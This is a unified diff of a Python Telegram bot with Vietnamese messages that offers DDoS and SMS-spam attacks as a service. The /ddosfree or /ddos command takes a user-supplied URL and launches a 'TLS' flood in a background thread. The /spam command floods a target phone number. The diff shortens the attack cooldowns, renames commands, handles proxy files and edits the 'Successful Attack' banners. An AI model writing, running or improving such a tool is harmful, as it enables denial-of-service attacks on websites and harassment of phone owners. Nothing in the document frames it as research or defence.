@@ -96,12 +96,9 @@ def laykey(message):
             url_key = "Lấy Key Lỗi Vui Lòng Sử Dụng Lại Lệnh /getkey"
     except requests.exceptions.RequestException as e:
         url_key = "Lấy Key Lỗi Vui Lòng Sử Dụng Lại Lệnh /getkey"
-    
-    text = f'''
-━➤ GET KEY THÀNH CÔNG
-━➤ Key Hôm Nay Là: {key}
-    '''
-    bot.reply_to(message, text).json
+        
+    text = key
+    bot.reply_to(message, text)
 
 @bot.message_handler(commands=['key'])
 def key(message):
@@ -129,14 +126,11 @@ def help(message):
 ┗━━━━━━━━━━━━━━➤
 - /getkey : Để lấy key miễn phí
 - /key <key vừa lấy> : Để nhập key miễn phí
-
-- /muakey : Để lấy key VIP
-- /nhapkey <key vừa mua> : Để nhập key VIP
 ┏━━━━━━━━━━━━━━┓
 ┃  Lệnh Free
 ┗━━━━━━━━━━━━━━➤
 - /spam <số điện thoại> : Để tiến hành spam
-- /ddosfree <link website> : Để tiến hành tấn công ddos
+- /ddosfree <url> : Để tiến hành tấn công ddos
 ┏━━━━━━━━━━━━━━┓
 ┃  Lệnh Có Ích
 ┗━━━━━━━━━━━━━━➤
@@ -159,7 +153,7 @@ def nhapkeyvip(message):
 @bot.message_handler(commands=['vip'])
 def vipsms(message):
     pass
-@bot.message_handler(commands=['ddosfree'])
+@bot.message_handler(commands=['ddos'])
 def didotv(message):
     pass
 @bot.message_handler(commands=['setflood'])
@@ -190,7 +184,7 @@ def run_attack(command, duration, message):
         # Check CPU usage and terminate if it's too high for 10 seconds
         if psutil.cpu_percent(interval=1) >= 1:
             time_passed = time.time() - start_time
-            if time_passed >= 120:
+            if time_passed >= 90:
                 cmd_process.terminate()
                 bot.reply_to(message, "Đã Dừng Lệnh Tấn Công, Cảm Ơn Bạn Đã Sử Dụng")
                 return
@@ -205,7 +199,7 @@ def ddos_command(message):
     user_id = message.from_user.id
     
     if not is_bot_active:
-        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
+        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại')
         return
     
     if user_id not in allowed_users:
@@ -213,15 +207,15 @@ def ddos_command(message):
         return
 
     if len(message.text.split()) < 2:
-        bot.reply_to(message, 'Vui lòng nhập đúng cú pháp.\nVí dụ: /ddosfree <link website>')
+        bot.reply_to(message, 'Vui lòng nhập đúng cú pháp.\nVí dụ: /ddosfree <url>')
         return
 
     username = message.from_user.username
 
     current_time = time.time()
-    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 120:
-        remaining_time = int(120 - (current_time - cooldown_dict[username].get('attack', 0)))
-        bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh /attack")
+    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 10:
+        remaining_time = int(10 - (current_time - cooldown_dict[username].get('attack', 0)))
+        bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh")
         return
     
     host = message.text.split()[1]
@@ -232,7 +226,7 @@ def ddos_command(message):
 
     attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
     attack_thread.start()
-    bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃   Successful Attack!!!\n┗━━━━━━━━━━━━━━➤\n  ┏➤Admin : quangnqtoolcode\n  ➤ Tấn Công Bởi » {username} «\n  ➤ Host » {host} «\n  ➤ TIME » 120s «\n  ➤ Methods » TLS «\n  ➤ Cooldown » 120s «\n  ➤ Plan » Free «')
+    bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃   Successful Attack!!!\n┗━━━━━━━━━━━━━━➤\n  ┏➤Admin : Quang\n  ➤ Tấn Công Bởi » {username} «\n  ➤ Host » {host} «\n  ➤ TIME » 120 «\n  ➤ Methods » TLS VIP«\n  ➤ Cooldown » 10s «\n  ➤ Plan » Free «')
 
 
 @bot.message_handler(commands=['proxy'])
@@ -398,7 +392,7 @@ def get_proxy_info(message):
             bot.send_document(message.chat.id, open("proxy.txt", "rb"))
             proxy_update_count += 1
     except FileNotFoundError:
-        bot.reply_to(message, "Không tìm thấy file proxy.txt")
+        bot.reply_to(message, "Không tìm thấy file proxy.txt.")
 
 
 @bot.message_handler(commands=['time'])
@@ -473,8 +467,8 @@ def attack_command(message):
 
     attack_thread = threading.Thread(target=run_sms, args=(command, duration, message))
     attack_thread.start()
-    bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃   Spam Thành Công!!!\n┗━━━━━━━━━━━━━━➤\n┏━━━━━━━━━━━━━━┓\n┣➤ User: @{username} \n┣➤ Phone: {phone_number} \n┣➤ Time: {duration} Giây\n┣➤ Plan: Free \n┣➤ Admin: @quangnqtoolcode\n┗━━━━━━━━━━━━━━➤')
-    
+    bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃   Spam Thành Công!!!\n┗━━━━━━━━━━━━━━➤\n┏━━━━━━━━━━━━━━┓\n┣➤ User: @{username} \n┣➤ Phone: {phone_number} \n┣➤ Time: {duration} Giây\n┣➤ Plan: Free \n┣➤ Admin: quangnqtoolcode\n┗━━━━━━━━━━━━━━➤')
+
 def check_proxy():
     try:
         with open("proxy.txt", "r") as file:
@@ -483,7 +477,6 @@ def check_proxy():
     except FileNotFoundError:
         return 0
 
-# Hàm xử lý khi admin gửi tệp
 @bot.message_handler(content_types=['document'])
 def handle_proxy_file(message):
     try:
@@ -505,9 +498,9 @@ def handle_proxy_file(message):
         bot.reply_to(message, f"Hiện tại có {proxy_count} proxy trong proxy.txt.")
     except Exception as e:
         bot.reply_to(message, f"Đã xảy ra lỗi: {e}")
-    
+
 @bot.message_handler(func=lambda message: message.text.startswith('/'))
 def invalid_command(message):
-    bot.reply_to(message, 'Lệnh không hợp lệ. Vui lòng sử dụng lệnh /help để xem danh sách lệnh')
+    bot.reply_to(message, 'Lệnh không hợp lệ. Vui lòng sử dụng lệnh /help để xem danh sách lệnh.')
 
 bot.infinity_polling(timeout=60, long_polling_timeout = 1)
